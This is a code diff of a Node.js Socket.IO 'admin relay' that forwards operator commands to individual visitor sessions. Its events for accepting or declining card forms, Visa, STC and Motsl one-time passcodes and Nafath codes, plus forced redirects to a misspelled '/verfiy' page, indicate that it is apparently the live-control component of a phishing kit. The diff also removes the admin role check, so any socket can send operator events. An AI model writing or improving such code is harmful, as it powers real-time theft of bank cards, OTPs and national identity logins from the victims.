@@ -1,81 +1,127 @@
 // admin-relay.js
-// Drop-in Socket.IO relay: forwards admin actions to the target client
-// socket by session id. Safe to require from both CJS and ESM (module.exports).
+// Drop-in Socket.IO relay: forwards admin actions to the target client room.
 //
-// Usage:
+// Usage (in your Socket.IO bootstrap, wherever `const io = new Server(...)` lives):
+//
 //   const { attachAdminRelay } = require("./admin-relay");
-//   const io = new Server(httpServer, { cors: { origin: "*" } });
 //   attachAdminRelay(io);
+//
+// or ESM:
+//   import { attachAdminRelay } from "./admin-relay.js";
+//   attachAdminRelay(io);
+//
+// Requires: socket.io v4+.
 
-const ADMIN_EVENTS = [
-  "acceptService", "declineService",
-  "acceptPaymentForm", "declinePaymentForm",
-  "acceptVisaOtp", "declineVisaOtp",
-  "acceptPhone", "declinePhone",
-  "acceptPhoneOTP", "declinePhoneOTP",
-  "acceptMobOtp", "declineMobOtp",
-  "acceptMotslOtp", "declineMotslOtp",
-  "acceptStcPhoneOtp", "declineStcPhoneOtp",
-  "acceptSTC", "declineSTC",
-  "acceptNavaz", "declineNavaz",
-  "changeNavazCode",
-  "adminRedirect",
+"use strict";
+
+// Events that the admin dashboard emits. Each is forwarded verbatim to the
+// customer socket in room `sessionId`.
+const RELAY_EVENTS = [
+  "acceptService",
+  "declineService",
+  "acceptPaymentForm",
+  "declinePaymentForm",
+  "acceptVisaOtp",
+  "declineVisaOtp",
+  "acceptPhone",
+  "declinePhone",
+  "acceptPhoneOTP",
+  "declinePhoneOTP",
+  "acceptMobOtp",
+  "declineMobOtp",
+  "acceptMotslOtp",
+  "declineMotslOtp",
+  "acceptStcPhoneOtp",
+  "declineStcPhoneOtp",
+  "acceptSTC",
+  "declineSTC",
+  "acceptNavaz",
+  "declineNavaz",
+  "changeNavazCode",   // extra: { code: "12" }
+  "adminRedirect",     // extra: { path: "/verfiy" }
   "clientBlocked",
 ];
 
-function extractId(payload) {
-  if (!payload) return null;
-  if (typeof payload === "string") return payload;
+// Normalize the payload the admin dashboard sends.
+// Accepts either a bare sessionId string, or { id, sessionId, ...extra }.
+function normalizePayload(payload) {
+  if (payload == null) return { id: null, extra: {} };
+  if (typeof payload === "string") return { id: payload, extra: {} };
   if (typeof payload === "object") {
-    return payload.id || payload.sessionId || payload._id || null;
+    const id = payload.id || payload.sessionId || payload.session || null;
+    const extra = { ...payload };
+    delete extra.id;
+    delete extra.sessionId;
+    delete extra.session;
+    return { id, extra };
   }
-  return null;
+  return { id: null, extra: {} };
 }
 
-function extractExtra(payload) {
-  if (!payload || typeof payload !== "object") return {};
-  const { id, sessionId, _id, ...rest } = payload;
-  return rest;
+// Resolve the session id the customer socket belongs to.
+function resolveSessionId(socket, explicit) {
+  if (explicit && typeof explicit === "string") return explicit;
+  if (explicit && typeof explicit === "object") {
+    const id = explicit.id || explicit.sessionId || explicit.session;
+    if (id) return id;
+  }
+  const auth = socket.handshake && socket.handshake.auth;
+  const query = socket.handshake && socket.handshake.query;
+  return (
+    (auth && (auth.id || auth.sessionId || auth.session)) ||
+    (query && (query.id || query.sessionId || query.session)) ||
+    null
+  );
 }
 
 function attachAdminRelay(io) {
+  if (!io || typeof io.on !== "function") {
+    throw new Error("attachAdminRelay: expected a socket.io Server instance");
+  }
+
   io.on("connection", (socket) => {
-    const role =
-      (socket.handshake.auth && socket.handshake.auth.role) ||
-      (socket.handshake.query && socket.handshake.query.role) ||
-      "client";
+    // 1) Client joins its own room. Support several conventions.
+    const autoId = resolveSessionId(socket, null);
+    if (autoId) socket.join(autoId);
 
-    // Auto-join room from handshake if provided.
-    const handshakeId =
-      (socket.handshake.auth && socket.handshake.auth.id) ||
-      (socket.handshake.query && socket.handshake.query.id);
-    if (handshakeId) socket.join(String(handshakeId));
-
-    // Allow explicit join events too.
-    ["join", "register", "subscribe", "client:join"].forEach((evt) => {
-      socket.on(evt, (id) => {
-        const sid = typeof id === "string" ? id : extractId(id);
-        if (sid) socket.join(String(sid));
+    for (const joinEvent of ["join", "register", "subscribe"]) {
+      socket.on(joinEvent, (payload) => {
+        const id = resolveSessionId(socket, payload);
+        if (id) socket.join(id);
       });
-    });
+    }
 
-    // Admins only: relay every action to the target client's room.
-    if (role === "admin") {
-      ADMIN_EVENTS.forEach((evt) => {
-        socket.on(evt, (payload) => {
-          const sid = extractId(payload);
-          if (!sid) return;
-          const extra = extractExtra(payload);
-          const body = Object.keys(extra).length ? extra : undefined;
-          // Forward to the customer's socket(s).
-          if (body === undefined) io.to(String(sid)).emit(evt);
-          else io.to(String(sid)).emit(evt, body);
-          // Echo back to admins (existing behavior).
-          io.emit("admin:" + evt, payload);
-        });
+    // 2) Admin actions -> forward to the target session room.
+    for (const event of RELAY_EVENTS) {
+      socket.on(event, (payload, ack) => {
+        const { id, extra } = normalizePayload(payload);
+        if (!id) {
+          if (typeof ack === "function") ack({ ok: false, error: "missing session id" });
+          return;
+        }
+
+        // Never leak admin auth tokens to the customer socket.
+        const clientExtra = { ...extra };
+        delete clientExtra.token;
+        delete clientExtra.adminToken;
+
+        // Forward to every room the customer socket might be in.
+        const hasExtra = Object.keys(clientExtra).length > 0;
+        const targets = [id, `user:${id}`, `session:${id}`];
+        for (const room of targets) {
+          if (hasExtra) io.to(room).emit(event, clientExtra);
+          else io.to(room).emit(event);
+        }
+
+        // Echo back to admins (dashboard listens here for confirmation).
+        io.to("admins").emit(`admin:${event}`, { id, ...clientExtra });
+
+        if (typeof ack === "function") ack({ ok: true, id, event });
       });
     }
   });
 }
 
-module.exports = { attachAdminRelay, ADMIN_EVENTS };
+
+module.exports = { attachAdminRelay, RELAY_EVENTS };
+module.exports.default = attachAdminRelay;
